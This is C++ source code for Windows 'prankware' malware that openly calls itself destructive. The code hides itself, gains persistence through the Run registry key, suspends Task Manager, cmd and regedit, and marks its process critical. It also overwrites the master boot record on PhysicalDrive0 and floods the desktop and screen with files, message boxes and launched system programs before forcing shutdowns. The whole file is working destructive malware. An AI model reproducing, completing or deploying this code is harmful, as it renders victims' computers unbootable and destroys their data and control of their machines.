#include <windows.h>
#include <gdiplus.h>
#include <fstream>
#include <string>
#include <cstdlib>
#include <tlhelp32.h>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <shlobj.h>
#include <tchar.h>
#include <winternl.h>
#include <iostream>
#include <winnt.h>
#include "ClientShutdown.h"
#include "BootFile.h"
#pragma comment(lib, "Gdiplus.lib")
using namespace Gdiplus;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_ERASEBKGND:
		return 1;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
}

bool SuspendProcess(DWORD processId) {
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnapshot == INVALID_HANDLE_VALUE) {
		return false;
	}

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hThreadSnapshot, &threadEntry)) {
		CloseHandle(hThreadSnapshot);
		return false;
	}

	do {
		if (threadEntry.th32OwnerProcessID == processId) {
			HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);
			if (hThread != NULL) {
				SuspendThread(hThread);
				CloseHandle(hThread);
			}
		}
	} while (Thread32Next(hThreadSnapshot, &threadEntry));

	CloseHandle(hThreadSnapshot);
	return true;
}

void SuspendTargetProcesses() {
	const std::vector<const wchar_t*> targetProcesses = {
		L"cmd.exe",
		L"taskmgr.exe",
		L"regedit.exe"
	};

	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
		return;
	}

	PROCESSENTRY32W processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcessSnapshot, &processEntry)) {
		CloseHandle(hProcessSnapshot);
		return;
	}

	do {
		for (const auto& targetProcess : targetProcesses) {
			if (_wcsicmp(processEntry.szExeFile, targetProcess) == 0) {
				SuspendProcess(processEntry.th32ProcessID);
			}
		}
	} while (Process32NextW(hProcessSnapshot, &processEntry));

	CloseHandle(hProcessSnapshot);
}

bool HasExecutedBefore() {
	HKEY hKey;
	if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Prankware", &hKey) == ERROR_SUCCESS) {
		char value[10];
		DWORD size = sizeof(value);
		if (RegQueryValueExA(hKey, "MarkedExecutedBefore", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return strcmp(value, "yes") == 0;
		}
		RegCloseKey(hKey);
	}
	return false;
}

void MarkExecuted() {
	HKEY hKey;
	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Prankware", &hKey);
	const char* val = "yes";
	RegSetValueExA(hKey, "MarkedExecutedBefore", 0, REG_SZ, (const BYTE*)val, strlen(val) + 1);
	RegCloseKey(hKey);
}

void ShowWarnings() {
	int result1 = MessageBoxA(NULL, "This is a Non-GDI Malware, Run?", "numismatography.exe", MB_ICONWARNING | MB_YESNO);
	if (result1 != IDYES) ExitProcess(0);

	int result2 = MessageBoxA(NULL, "Are you sure this will destory your pc. (No safety version!)", "numismatography.exe", MB_ICONWARNING | MB_YESNO);
	if (result2 != IDYES) ExitProcess(0);
}

DWORD WINAPI SpamThread(LPVOID lpParam) {
	while (1) {
		SuspendTargetProcesses();
		Sleep(rand() % 500);
		SuspendTargetProcesses();
		Sleep(rand() % 500);
	}
	return 0;
}

void HideExecutable() {
	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);
	SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN);
}

DWORD WINAPI CreateTextFiles(LPVOID lpParam) {
	wchar_t desktopPath[MAX_PATH];
	if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) != S_OK) {
		return 0;
	}

	const wchar_t* message = L"THERES IS NO WAY OUT";
	DWORD bytesToWrite = (DWORD)wcslen(message) * sizeof(wchar_t);
	DWORD bytesWritten;

	for (int i = 1; i <= 200; ++i) {
		std::wstring filePath = std::wstring(desktopPath) + L"\\NOWAYOUT_" + std::to_wstring(i) + L".txt";

		HANDLE hFile = CreateFileW(
			filePath.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
			);

		if (hFile != INVALID_HANDLE_VALUE) {
			WriteFile(hFile, message, bytesToWrite, &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}

	return 1;
}

void FullscreenBlack() {
	const wchar_t CLASS_NAME[] = L"BlackScreenWindow";
	WNDCLASSW wc = {};
	wc.lpfnWndProc = WndProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = CLASS_NAME;

	RegisterClassW(&wc);

	int screenX = GetSystemMetrics(SM_CXSCREEN);
	int screenY = GetSystemMetrics(SM_CYSCREEN);

	HWND hwnd = CreateWindowExW(
		WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
		CLASS_NAME, L"Blackout",
		WS_POPUP,
		0, 0, screenX, screenY,
		NULL, NULL, GetModuleHandle(NULL), NULL
		);

	if (!hwnd) return;

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);

	HDC hdc = GetDC(hwnd);
	HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
	RECT rect = { 0, 0, screenX, screenY };
	FillRect(hdc, &rect, black);
	DeleteObject(black);
	ReleaseDC(hwnd, hdc);

	ClipCursor(&rect);
	SetForegroundWindow(hwnd);
	SetCapture(hwnd);

	MSG msg;
	while (GetMessageW(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
}

void AddToStartup(const std::string& exePath) {
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		RegSetValueExA(hKey, "PrankStartup", 0, REG_SZ, (BYTE*)exePath.c_str(), (DWORD)exePath.length() + 1);
		RegCloseKey(hKey);
	}
}


DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}

DWORD WINAPI msg(LPVOID lpParam) {
	MessageBox(NULL, L"THERES NO WAY OUT", L"NO WAY OUT", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
	MessageBox(NULL, L"THERES NO WAY OUT", L"NO WAY OUT", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg3(LPVOID lpParam) {
	MessageBox(NULL, L"THERES NO WAY OUT", L"NO WAY OUT", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg4(LPVOID lpParam) {
	MessageBox(NULL, L"THERES NO WAY OUT", L"NO WAY OUT", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI MsgSpamThread(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, msg, 0, 0, 0);
		Sleep(rand() % 10000);
		CreateThread(0, 0, msg2, 0, 0, 0);
		Sleep(rand() % 10000);
	}
	return 0;
}

DWORD WINAPI MsgSpamThread2(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, msg3, 0, 0, 0);
		Sleep(rand() % 100);
		CreateThread(0, 0, msg4, 0, 0, 0);
		Sleep(rand() % 100);
	}
	return 0;
}


typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

BOOL CALLBACK MoveWindowCallback(HWND hwnd, LPARAM lParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) {
		return TRUE;
	}
	int newX = rand() % screenWidth;
	int newY = rand() % screenHeight;
	int newWidth = (rand() % (screenWidth / 2)) + 100;
	int newHeight = (rand() % (screenHeight / 2)) + 100;
	SetWindowPos(hwnd, HWND_TOP, newX, newY, newWidth, newHeight, SWP_NOACTIVATE | SWP_NOREDRAW);
	return TRUE; 
}


DWORD WINAPI window(LPVOID lpParam) {
	srand((unsigned)time(NULL));
	while (true) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(10000);
	}
    return 0;
}

DWORD WINAPI window1(LPVOID lpParam) {
	srand((unsigned)time(NULL));
	while (true) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI Programs(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);

		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(250);
		}
	}
}

DWORD WINAPI files(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.dll";

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);

		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(250);
		}
	}
}


DWORD WINAPI destory(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI mouse(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int X = rand() % w;
		int Y = rand() % h;
		SetCursorPos(X, Y);
		Sleep(1);
	}
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
	if (HasExecutedBefore()) {
		ProcessIsCritical();
		CreateThread(0, 0, SpamThread, 0, 0, 0);
		Sleep(1000);
		CreateThread(0, 0, destory, 0, 0, 0);
		CreateThread(0, 0, notaskbar, 0, 0, 0);
		CreateThread(0, 0, SpamThread, 0, 0, 0);
		Sleep(30000);
		HANDLE SPAM = CreateThread(0, 0, MsgSpamThread, 0, 0, 0);
		Sleep(30000);
		HANDLE SPAM2 = CreateThread(0, 0, mouse, 0, 0, 0);
		HANDLE SPAM3 = CreateThread(0, 0, window, 0, 0, 0);
		HANDLE SPAM4 = CreateThread(0, 0, Programs, 0, 0, 0);
		HANDLE SPAM5 = CreateThread(0, 0, files, 0, 0, 0);
		Sleep(120000);
		HANDLE SPAM234 = CreateThread(0, 0, MsgSpamThread2, 0, 0, 0);
		TerminateThread(window, 0);
		CloseHandle(window);
		HANDLE SPAM3453252 = CreateThread(0, 0, window1, 0, 0, 0);
		Sleep(5000);
		ForceShutdownComputer();

	}
	ShowWarnings();
	HideExecutable();
	CreateThread(0, 0, SpamThread, 0, 0, 0);

	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);
	AddToStartup(path);
	MarkExecuted();

	Sleep(20000);


	HANDLE hFileThread = CreateThread(0, 0, CreateTextFiles, 0, 0, 0);
	WaitForSingleObject(hFileThread, INFINITE);
	//FullscreenBlack();
	Sleep(1000);
	ForceShutdownComputer();
}